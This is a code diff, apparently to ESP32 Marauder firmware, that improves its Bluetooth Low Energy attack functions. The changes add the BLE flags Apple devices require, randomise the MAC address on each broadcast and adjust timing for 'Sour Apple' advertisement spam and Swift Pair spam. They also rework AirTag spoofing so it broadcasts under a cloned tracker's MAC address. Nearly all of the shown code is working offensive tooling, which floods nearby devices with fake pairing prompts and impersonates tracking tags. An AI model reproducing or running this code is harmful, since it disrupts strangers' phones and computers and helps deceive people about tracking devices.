@@ -64,13 +64,19 @@ WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
     break;
   }
   case Apple: {
-    AdvData_Raw = new uint8_t[17];
+    AdvData_Raw = new uint8_t[20]; // 3 (Flags) + 17 (Mfg Data)
 
-    AdvData_Raw[i++] = 17 - 1; // Packet Length
+    // Add Mandatory BLE Flags (Length 2, Type 0x01, Value 0x06)
+    // Required for Apple devices to recognize the advertisement
+    AdvData_Raw[i++] = 0x02;
+    AdvData_Raw[i++] = 0x01;
+    AdvData_Raw[i++] = 0x06;
+
+    AdvData_Raw[i++] = 17 - 1; // Mfg Data Length
     AdvData_Raw[i++] = 0xFF;   // Packet Type (Manufacturer Specific)
     AdvData_Raw[i++] = 0x4C;   // Packet Company ID (Apple, Inc.)
     AdvData_Raw[i++] = 0x00;   // ...
-    AdvData_Raw[i++] = 0x0F;   // Type
+    AdvData_Raw[i++] = 0x0F;   // Type (Continuity)
     AdvData_Raw[i++] = 0x05;   // Length
     AdvData_Raw[i++] = 0xC1;   // Action Flags
     const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d,
@@ -83,7 +89,7 @@ WiFiScan::GetUniversalAdvertisementData(EBLEPayloadType Type) {
     AdvData_Raw[i++] = 0x10; // Type ???
     esp_fill_random(&AdvData_Raw[i], 3);
 
-    AdvData.addData(AdvData_Raw, 17);
+    AdvData.addData(AdvData_Raw, 20);
     break;
   }
   case Samsung: {
@@ -2202,7 +2208,7 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color) {
   esp_wifi_start();
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_promiscuous_filter(&filt);
-  esp_wifi_set_promiscuous_rx_cb(&beaconSnifferCallback);
+  esp_wifi_set_promiscuous_rx_cb(&pwnSnifferCallback);
   esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
   this->wifi_initialized = true;
   initTime = millis();
@@ -2210,64 +2216,81 @@ void WiFiScan::RunPwnScan(uint8_t scan_mode, uint16_t color) {
 
 void WiFiScan::executeSourApple() {
 #ifdef HAS_BT
+  // 1. Init once and stay alive
   if (!this->ble_initialized) {
     NimBLEDevice::init("");
     NimBLEServer *pServer = NimBLEDevice::createServer();
-    pAdvertising = pServer->getAdvertising();
-    this->ble_initialized = true;
+    if (pServer != nullptr) {
+      pAdvertising = pServer->getAdvertising();
+      this->ble_initialized = true;
+    }
   }
 
-  // NimBLEAdvertisementData advertisementData = getOAdvertisementData();
+  // 2. Safety check
+  if (!this->ble_initialized || pAdvertising == nullptr) return;
+
+  uint8_t macAddr[6];
+  esp_fill_random(macAddr, 6);
+  macAddr[0] |= 0xC0; 
+  macAddr[0] &= 0xFE; 
+
+  this->setBaseMacAddress(macAddr);
+
+  // 3. Broadcast
+  pAdvertising->stop();
   NimBLEAdvertisementData advertisementData =
       this->GetUniversalAdvertisementData(Apple);
   pAdvertising->setAdvertisementData(advertisementData);
+  
+  Serial.printf("[BLE] Spamming Apple with MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
+                macAddr[0], macAddr[1], macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
+
   pAdvertising->start();
-  
-  // Extend delay for C5 radio to actually broadcast the packet
-  #ifdef MARAUDER_FLIPPER_C5
-    vTaskDelay(pdMS_TO_TICKS(100));
-  #else
-    delay(20);
-  #endif
-  
+  yield();
+  vTaskDelay(pdMS_TO_TICKS(100)); // Optimized timing for Apple devices
   pAdvertising->stop();
+  yield();
 #endif
 }
 
-/*void WiFiScan::generateRandomName(char *name, size_t length) {
-    static const char alphabet[] = "abcdefghijklmnopqrstuvwxyz";
-
-    // Generate the first character as uppercase
-    name[0] = 'A' + (rand() % 26);
-
-    // Generate the remaining characters as lowercase
-    for (size_t i = 1; i < length - 1; ++i) {
-        name[i] = alphabet[rand() % (sizeof(alphabet) - 1)];
+void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
+#ifdef HAS_BT
+  // 1. Init once and stay alive
+  if (!this->ble_initialized) {
+    NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+    if (pServer != nullptr) {
+      pAdvertising = pServer->getAdvertising();
+      this->ble_initialized = true;
     }
-    name[length - 1] = '\0';  // Null-terminate the string
-}*/
-
-/*const char* WiFiScan::generateRandomName() {
-  const char* charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-  int len = rand() % 10 + 1; // Generate a random length between 1 and 10
-  char* randomName = (char*)malloc((len + 1) * sizeof(char)); // Allocate memory
-for the random name for (int i = 0; i < len; ++i) { randomName[i] =
-charset[rand() % strlen(charset)]; // Select random characters from the charset
   }
-  randomName[len] = '\0'; // Null-terminate the string
-  return randomName;
-}*/
 
-/*void WiFiScan::generateRandomMac(uint8_t* mac) {
-  // Set the locally administered bit and unicast bit for the first byte
-  mac[0] = 0x02; // The locally administered bit is the second least significant
-bit
+  // 2. Safety check
+  if (!this->ble_initialized || pAdvertising == nullptr) return;
 
-  // Generate the rest of the MAC address
-  for (int i = 1; i < 6; i++) {
-    mac[i] = random(0, 255);
-  }
-}*/
+  uint8_t macAddr[6];
+  esp_fill_random(macAddr, 6);
+  macAddr[0] |= 0xC0; 
+  macAddr[0] &= 0xFE; 
+
+  this->setBaseMacAddress(macAddr);
+
+  // 3. Broadcast
+  pAdvertising->stop();
+  NimBLEAdvertisementData advertisementData =
+      this->GetUniversalAdvertisementData(type);
+  pAdvertising->setAdvertisementData(advertisementData);
+
+  Serial.printf("[BLE] Spamming Type %d with MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
+                (int)type, macAddr[0], macAddr[1], macAddr[2], macAddr[3], macAddr[4], macAddr[5]);
+
+  pAdvertising->start();
+  yield();
+  vTaskDelay(pdMS_TO_TICKS(100));
+  pAdvertising->stop();
+  yield();
+#endif
+}
 
 void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
   // Use ESP-IDF function to set the base MAC address
@@ -2285,65 +2308,40 @@ void WiFiScan::setBaseMacAddress(uint8_t macAddr[6]) {
 
 void WiFiScan::executeSpoofAirtag() {
 #ifdef HAS_BT
+  // 1. Init once
+  if (!this->ble_initialized) {
+    NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+    if (pServer != nullptr) {
+      pAdvertising = pServer->getAdvertising();
+      this->ble_initialized = true;
+    }
+  }
+
+  if (!this->ble_initialized || pAdvertising == nullptr) return;
+
   for (int i = 0; i < airtags->size(); i++) {
     if (airtags->get(i).selected) {
-
       uint8_t macAddr[6];
-
       convertMacStringToUint8(airtags->get(i).mac, macAddr);
-
       macAddr[5] -= 2;
-
-      // Do this because ESP32 BT addr is Base MAC + 2
 
       this->setBaseMacAddress(macAddr);
 
-      NimBLEDevice::init("");
-
-      NimBLEServer *pServer = NimBLEDevice::createServer();
-
-      pAdvertising = pServer->getAdvertising();
-
-      // NimBLEAdvertisementData advertisementData =
-      // getSwiftAdvertisementData();
+      pAdvertising->stop();
       NimBLEAdvertisementData advertisementData =
           this->GetUniversalAdvertisementData(Airtag);
       pAdvertising->setAdvertisementData(advertisementData);
       pAdvertising->start();
-      delay(10);
+      vTaskDelay(pdMS_TO_TICKS(100));
       pAdvertising->stop();
-
-      NimBLEDevice::deinit();
-
       break;
     }
   }
 #endif
 }
 
-void WiFiScan::executeSwiftpairSpam(EBLEPayloadType type) {
-#ifdef HAS_BT
-  if (!this->ble_initialized) {
-    NimBLEDevice::init("");
-    NimBLEServer *pServer = NimBLEDevice::createServer();
-    pAdvertising = pServer->getAdvertising();
-    this->ble_initialized = true;
-  }
 
-  NimBLEAdvertisementData advertisementData =
-      this->GetUniversalAdvertisementData(type);
-  pAdvertising->setAdvertisementData(advertisementData);
-  pAdvertising->start();
-  
-  #ifdef MARAUDER_FLIPPER_C5
-    vTaskDelay(pdMS_TO_TICKS(80));
-  #else
-    delay(10);
-  #endif
-  
-  pAdvertising->stop();
-#endif
-}
 
 void WiFiScan::executeWarDrive() {
 #ifdef HAS_GPS
@@ -2811,6 +2809,8 @@ void WiFiScan::RunSourApple(uint8_t scan_mode, uint16_t color) {
   led_obj.setMode(MODE_SNIFF);
 #endif
 
+  this->wifi_initialized = true;
+  initTime = millis();
 #endif
 }
 
@@ -2861,6 +2861,9 @@ void WiFiScan::RunSwiftpairSpam(uint8_t scan_mode, uint16_t color) {
 #else
   led_obj.setMode(MODE_ATTACK);
 #endif
+
+  this->wifi_initialized = true;
+  initTime = millis();
 #endif
 }
 
@@ -3014,18 +3017,7 @@ void WiFiScan::RunBluetoothScan(uint8_t scan_mode, uint16_t color) {
 #ifndef MARAUDER_FLIPPER_C5
   Serial.println("Started BLE Scan");
 #endif
-  this->ble_initialized = true;
-
-#ifdef MARAUDER_FLIPPER
-  flipper_led.sniffLED();
-#elif defined(XIAO_ESP32_S3)
-  xiao_led.sniffLED();
-#elif defined(MARAUDER_M5STICKC)
-  stickc_led.sniffLED();
-#else
-  led_obj.setMode(MODE_SNIFF);
-#endif
-
+  this->wifi_initialized = true;
   initTime = millis();
 #endif
 }
